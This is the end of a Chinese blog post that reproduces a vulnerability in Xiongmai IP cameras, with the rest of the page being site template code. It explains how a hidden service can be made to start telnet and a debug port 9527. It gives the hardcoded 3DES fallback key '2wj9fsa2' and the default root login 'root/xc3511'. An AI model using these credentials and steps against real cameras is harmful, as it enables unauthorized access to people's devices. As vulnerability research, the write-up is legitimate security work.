+<h3 id="最终验证"><a href="#最终验证" class="headerlink" title="最终验证"></a>最终验证</h3><p>进入设备shell，运行设备初始化脚本，再次进行攻击，最终攻击效果：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202408011404101.png" alt="image-20240801140449890"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202408011404367.png" alt="image-20240801140424804"></p>
+<p>成功开启了Telnet，并根据</p>
+<pre class="language-none"><code class="language-none">User：root
+Password：xc3511</code></pre>
+
+<p>成功登陆设备</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在给程序发送消息，消息进入处理：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202408011443459.png" alt="image-20240801144343434"></p>
+<p>打印一些提示提示信息，已创建连接，消息的内容，然后就是验证OpenTelnet:OpenOnce，程序将会返回randNum；</p>
+<p>randNum是8位根据时间戳随机生成的十进制数</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202408011452506.png" alt="image-20240801145235472"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202408011453339.png" alt="image-20240801145353315"></p>
+<p>我们也就是客户端就需要发送这串随机数给服务器，并且发送的随机数是需要使用服务端提供的密钥进行加密的，然后客户端收到加密的密文，使用密钥解开，验证randNum；</p>
+<p>对于密钥，服务端会先寻找&#x2F;mnt&#x2F;custom&#x2F;TelnetOEMPasswd获取，没有的话就使用2wj9fsa2</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202408011457779.png" alt="image-20240801145724757"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202408011506093.png" alt="image-20240801150601047"></p>
+<p>对于加密函数encrypt：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202408011518904.png" alt="image-20240801151809870"></p>
+<p>经过分辨，这是一个3DES加密算法，具体请参考：</p>
+<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;tothi&#x2F;pyDes&#x2F;blob&#x2F;7a26fe09dc5b57b175c6439fbbf496414598a7a2&#x2F;pyDes.py#L108
+https:&#x2F;&#x2F;github.com&#x2F;tothi&#x2F;pyDes
+https:&#x2F;&#x2F;github.com&#x2F;polymorf&#x2F;findcrypt-yara
+https:&#x2F;&#x2F;bbs.kanxue.com&#x2F;thread-278321.htm#msg_header_h2_0
+https:&#x2F;&#x2F;www.4hou.com&#x2F;posts&#x2F;mGYE</code></pre>
+
+<p>若验证成功，则服务端发送verify:OK，并处理下一个消息CMD：加密算法与randNum是一样的，所以使用相同的方式加密后由客户端发送给服务端</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202408011509921.png" alt="image-20240801150912881"></p>
+<p>验证成功后进入check_open_telnet函数，验证消息是否是Telnet:OpenOnce，若是，则启动Telnetd，打印Telnet:Open OK…，响应Open:OK</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202408011510527.png" alt="image-20240801151022498"></p>
+<p>并启动调试端口9527</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202408011514480.png" alt="image-20240801151444452"></p>
+<p>至此，telnet已经被启动，可以凭借用户密码即可登陆设备</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2024/07/30/CVE-2023-45866%E8%93%9D%E7%89%99%E9%9B%B6%E7%82%B9%E5%87%BB%E6%BC%8F%E6%B4%9E/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2024-08-01 20:16:20
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/IOT%E5%AE%89%E5%85%A8/" title="IOT安全">
+                        #IOT安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2099/06/18/%E5%B7%A5%E5%85%B7%E4%B8%8E%E5%91%BD%E4%BB%A4/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9B%84%E8%BF%88"><span class="toc-text">雄迈</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6"><span class="toc-text">固件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F"><span class="toc-text">固件模拟</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%B4%E6%8D%A2%E8%AE%BE%E5%A4%87AHB7804R-LMS"><span class="toc-text">更换设备AHB7804R-LMS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E9%AA%8C%E8%AF%81"><span class="toc-text">初步验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E9%AA%8C%E8%AF%81"><span class="toc-text">最终验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞原理</span></a></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zh-Closure">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">Copyright © 2024 Closure</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">email | 765003952@qq.com</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+      
+      
+          本站访客数<span id="busuanzi_value_site_uv"></span>人
+        
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="可露希尔大涨价……">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E9%9B%84%E8%BF%88%E6%91%84%E5%83%8F%E5%A4%B4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0 + '&url=' + http%3A%2F%2Fexample.com%2F2024%2F08%2F01%2F%25E9%259B%2584%25E8%25BF%2588%25E6%2591%2584%25E5%2583%258F%25E5%25A4%25B4%25E6%25BC%258F%25E6%25B4%259E%25E5%25A4%258D%25E7%258E%25B0%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2024/08/01/%E9%9B%84%E8%BF%88%E6%91%84%E5%83%8F%E5%A4%B4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
